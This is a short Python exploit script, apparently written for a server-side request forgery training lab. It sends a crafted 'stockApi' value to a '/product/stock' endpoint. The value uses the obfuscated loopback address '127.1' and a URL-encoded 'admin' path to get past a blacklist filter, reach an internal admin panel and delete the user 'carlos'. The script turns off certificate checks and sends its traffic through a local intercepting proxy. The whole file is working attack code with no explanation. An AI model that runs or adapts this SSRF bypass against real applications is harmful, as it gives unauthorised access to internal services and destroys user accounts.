import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def del_user(url):
 check = '/product/stock'
 bypass = 'http://127.1/%61dmin/delete?username=carlos'
 params = {'stockApi':bypass}
 r = requests.post(url+check,data=params,verify=False,proxies=proxies)
 
 params2 = {'stockApi':'http://127.1/%61dmin/'}
 r = requests.post(url+check,data=params2,verify=False,proxies=proxies)
 if 'User deleted successfully' in r.text:
  print("(+) Successfully deleted Carlos user!")
 else:
  print("(-) Exploit was not successful.")

def main():
 if len(sys.argv)!=2:
  print("(+)Usage:python3 %s <url>"%sys.argv[0])
  sys.exit(-1)

 url = sys.argv[1]
 del_user(url)


if __name__  == "__main__":
 main()
